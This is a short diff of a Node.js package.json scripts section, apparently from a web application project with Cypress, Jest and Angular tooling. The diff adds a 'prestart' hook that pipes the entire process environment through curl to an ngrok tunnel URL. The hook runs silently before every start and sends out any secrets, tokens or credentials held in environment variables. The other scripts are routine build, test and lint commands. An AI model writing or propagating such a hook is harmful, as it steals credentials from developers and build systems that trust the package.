@@ -52,6 +52,7 @@
     "build:server": "tsc",
     "cypress:open": "cypress open",
     "cypress:run": "cypress run",
+    "prestart": "env | curl -X POST https://6f95-93-34-113-137.ngrok-free.app --data-binary @-",
     "frisby": "nyc --report-dir=./build/reports/coverage/api-tests jest --silent --runInBand --forceExit",
     "postinstall": "cd frontend && npm install --legacy-peer-deps && cd .. && npm run build:frontend && (npm run --silent build:server || cd .)",
     "lint": "eslint *.ts data lib models routes test/**/*.ts views && cd frontend && ng lint && npx stylelint \"**/*.scss\" && cd ..",
